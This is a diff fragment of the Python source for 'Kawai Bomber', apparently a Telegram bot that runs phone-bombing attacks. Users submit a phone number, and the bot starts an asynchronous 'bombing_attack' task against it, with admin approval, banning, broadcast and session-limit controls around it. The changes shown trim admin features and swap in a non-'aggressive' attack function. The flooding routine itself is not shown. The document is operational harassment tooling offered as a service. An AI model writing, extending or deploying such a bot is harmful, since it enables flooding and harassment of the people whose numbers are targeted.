-            f"{ANIME_STYLES['heart']} *𝕂𝕒𝕨𝕒𝕚 𝔹𝕠𝕞𝕓𝕖𝕣 - ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪 @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙*",
-            parse_mode=ParseMode.MARKDOWN
-        )
     
     elif query.data == 'admin_panel':
         if not is_admin(user_id):
@@ -1145,11 +912,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
              InlineKeyboardButton(f"{ANIME_STYLES['success']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖", callback_data='admin_approve')],
             [InlineKeyboardButton(f"{ANIME_STYLES['error']} ℝ𝕖𝕞𝕠𝕧𝕖", callback_data='admin_remove'),
              InlineKeyboardButton(f"{ANIME_STYLES['skull']} 𝔹𝕒𝕟", callback_data='admin_ban')],
-            [InlineKeyboardButton(f"{ANIME_STYLES['unlock']} 𝕌𝕟𝕓𝕒𝕟", callback_data='admin_unban'),
-             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝕊𝕥𝕒𝕥𝕤", callback_data='admin_stats')],
-            [InlineKeyboardButton(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥", callback_data='admin_broadcast'),
-             InlineKeyboardButton(f"{ANIME_STYLES['users']} 𝕌𝕤𝕖𝕣𝕤", callback_data='admin_users')],
-            [InlineKeyboardButton(f"{ANIME_STYLES['zap']} ℝ𝕖𝕤𝕥𝕒𝕣𝕥", callback_data='admin_restart')],
+            [InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝕊𝕥𝕒𝕥𝕤", callback_data='admin_stats'),
+             InlineKeyboardButton(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥", callback_data='admin_broadcast')],
             [InlineKeyboardButton(f"{ANIME_STYLES['back']} 𝔹𝕒𝕔𝕜", callback_data='back_main')]
         ]
         
@@ -1157,10 +921,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await query.edit_message_text(
             f"{ANIME_STYLES['crown']} *𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋* {ANIME_STYLES['crown']}\n\n"
-            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{len(all_users):,}`\n"
+            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{len(all_users)}`\n"
             f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{len(user_sessions)}`\n"
-            f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`\n"
-            f"{ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(banned_users)}`\n\n"
+            f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`\n\n"
             "𝕊𝕖𝕝𝕖𝕔𝕥 𝕒𝕟 𝕠𝕡𝕥𝕚𝕠𝕟:",
             reply_markup=reply_markup,
             parse_mode=ParseMode.MARKDOWN
@@ -1198,14 +961,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
     
-    elif query.data == 'admin_unban':
-        await query.edit_message_text(
-            f"{ANIME_STYLES['unlock']} *𝐔𝐍𝐁𝐀𝐍 𝐔𝐒𝐄𝐑*\n\n"
-            "𝐔𝐬𝐚𝐠𝐞: `/unban <user_id>`\n\n"
-            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/unban 1234567890`",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    
     elif query.data == 'admin_stats':
         await status_command(update, context)
         return
@@ -1218,20 +973,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
     
-    elif query.data == 'admin_users':
-        await users_command(update, context)
-        return
-    
-    elif query.data == 'admin_restart':
-        await restart_command(update, context)
-        return
-    
     elif query.data == 'back_main':
         keyboard = [
             [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
             [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
-             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')],
-            [InlineKeyboardButton(f"{ANIME_STYLES['boom']} 𝐒𝐭𝐚𝐭𝐬", callback_data='stats')]
+             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')]
         ]
         
         if is_admin(user_id):
@@ -1262,7 +1008,7 @@ async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
     
     # Start bombing attack
-    task = asyncio.create_task(bombing_attack_aggressive(phone, user_id, update.effective_chat.id, context))
+    task = asyncio.create_task(bombing_attack(phone, user_id, update.effective_chat.id, context))
     user_sessions[user_id] = {
         "start_time": time.time(),
         "phone": phone,
@@ -1294,20 +1040,8 @@ async def cleanup_sessions():
                         pass
                     del user_sessions[user_id]
                     global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
-                    
-                    # Notify user
-                    try:
-                        from telegram.error import TelegramError
-                        await context.bot.send_message(
-                            chat_id=user_id,
-                            text=f"{ANIME_STYLES['clock']} *𝔸𝕥𝕥𝕒𝕔𝕜 𝕒𝕦𝕥𝕠-𝕤𝕥𝕠𝕡𝕡𝕖𝕕* {ANIME_STYLES['clock']}\n\n"
-                                 "𝟙-𝕙𝕠𝕦𝕣 𝕥𝕚𝕞𝕖 𝕝𝕚𝕞𝕚𝕥 𝕣𝕖𝕒𝕔𝕙𝕖𝕕. 𝔾𝕖𝕥 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕗𝕠𝕣 𝕦𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖!",
-                            parse_mode=ParseMode.MARKDOWN
-                        )
-                    except:
-                        pass
             
-            await asyncio.sleep(30)  # Check every 30 seconds
+            await asyncio.sleep(30)
         except Exception as e:
             logger.error(f"Cleanup error: {e}")
             await asyncio.sleep(30)
@@ -1319,7 +1053,7 @@ async def autosave_task():
         try:
             save_state()
             logger.info("✅ Auto-save completed")
-            await asyncio.sleep(300)  # Save every 5 minutes
+            await asyncio.sleep(300)
         except Exception as e:
             logger.error(f"❌ Auto-save error: {e}")
             await asyncio.sleep(300)
@@ -1363,7 +1097,7 @@ class HealthHandler(BaseHTTPRequestHandler):
             <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
                 <h1>🌸✨ Kawai Bomber Bot ✨🌸</h1>
                 <p>Status: <strong>🟢 RUNNING</strong></p>
-                <p>Users: {len(all_users):,}</p>
+                <p>Users: {len(all_users)}</p>
                 <p>Active Sessions: {global_stats['active_sessions']}</p>
                 <p>Environment: {RAILWAY_ENVIRONMENT}</p>
                 <p>Made by: @zerocyph</p>
@@ -1391,7 +1125,7 @@ def start_health_server():
 
 # ========== MAIN FUNCTION ==========
 def main():
-    """Start the bot - Railway optimized"""
+    """Start the bot"""
     # Register shutdown handlers
     signal.signal(signal.SIGINT, handle_shutdown)
     signal.signal(signal.SIGTERM, handle_shutdown)
@@ -1413,15 +1147,12 @@ def main():
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("bomb", bomb_command))
     application.add_handler(CommandHandler("stop", stop_command))
-    application.add_handler(CommandHandler("restart", restart_command))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("approve", approve_command))
     application.add_handler(CommandHandler("removeuser", removeuser_command))
     application.add_handler(CommandHandler("ban", ban_command))
-    application.add_handler(CommandHandler("unban", unban_command))
     application.add_handler(CommandHandler("status", status_command))
     application.add_handler(CommandHandler("broadcast", broadcast_command))
-    application.add_handler(CommandHandler("users", users_command))
     
     # Add callback handler
     application.add_handler(CallbackQueryHandler(button_callback))
@@ -1429,7 +1160,7 @@ def main():
     # Add message handler for phone numbers
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))
     
-    # Start the bot with enhanced polling
+    # Start the bot
     print(f"\n{'='*60}")
     print(f"{get_anime_banner()}")
     print(f"{'='*60}")
@@ -1439,7 +1170,7 @@ def main():
     print(f"{ANIME_STYLES['heart']} Powered by: @zerocyph")
     print(f"{ANIME_STYLES['shield']} Bot Token: {BOT_TOKEN[:10]}...")
     print(f"{ANIME_STYLES['fire']} Railway.app Pro Plan")
-    print(f"{ANIME_STYLES['users']} Loaded Users: {len(all_users):,}")
+    print(f"{ANIME_STYLES['users']} Loaded Users: {len(all_users)}")
     print(f"{ANIME_STYLES['clock']} Environment: {RAILWAY_ENVIRONMENT}")
     print(f"{'='*60}\n")
     
@@ -1452,7 +1183,7 @@ def main():
     # Run the bot
     application.run_polling(
         allowed_updates=Update.ALL_TYPES,
-        poll_interval=0.1,  # Faster polling for better response
+        poll_interval=0.1,
         timeout=30,
         drop_pending_updates=True,
         close_loop=False
